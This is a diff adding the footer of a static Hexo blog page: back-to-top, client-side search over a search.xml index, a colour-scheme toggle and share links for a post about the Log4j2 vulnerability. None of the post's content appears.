+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + java%E5%AE%89%E5%85%A8-Log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90 + '&url=' + https%3A%2F%2Fokaytc.github.io%2Fposts%2F6e79ce8b.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://okaytc.github.io/posts/6e79ce8b.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
